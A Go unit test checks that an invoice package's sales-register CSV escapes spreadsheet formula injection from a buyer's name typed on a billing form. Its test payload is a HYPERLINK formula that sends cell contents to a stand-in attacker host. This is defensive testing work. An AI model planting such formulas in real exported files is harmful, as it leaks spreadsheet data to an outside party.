package invoice

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"
)

// TestAuditWebSalesRegisterNeutralisesFormulas: the buyer types their name on
// the hosted /pay billing form (billingform.Parse: only a 200-byte limit). It
// becomes Recipient.Name (recipientSnapshot) and is written verbatim into
// sales_register.csv, which an operator opens in a spreadsheet. A cell that
// starts with = + - @ (or tab / CR) is evaluated as a formula there.
func TestAuditWebSalesRegisterNeutralisesFormulas(t *testing.T) {
	payload := `=HYPERLINK("https://evil.example/?d="&A1,"click")`
	d := doc{number: "INV-1", date: "2026-10-01", cur: "INR", supply: "B2C", rcp: Recipient{Name: payload, Country: "IN"}}
	f, err := salesRegister([]doc{d}).file()
	if err != nil {
		t.Fatal(err)
	}
	rows, err := csv.NewReader(bytes.NewReader(f.CSV)).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	for _, row := range rows[1:] {
		for _, cell := range row {
			if cell != "" && strings.ContainsRune("=+-@\t\r", rune(cell[0])) && !isNumber(cell) {
				t.Errorf("cell %q starts with a formula trigger; prefix it with ' (CSV injection)", cell)
			}
		}
	}
}

func isNumber(s string) bool {
	if s == "" {
		return false
	}
	s = strings.TrimPrefix(s, "-")
	for _, r := range s {
		if (r < '0' || r > '9') && r != '.' {
			return false
		}
	}
	return true
}
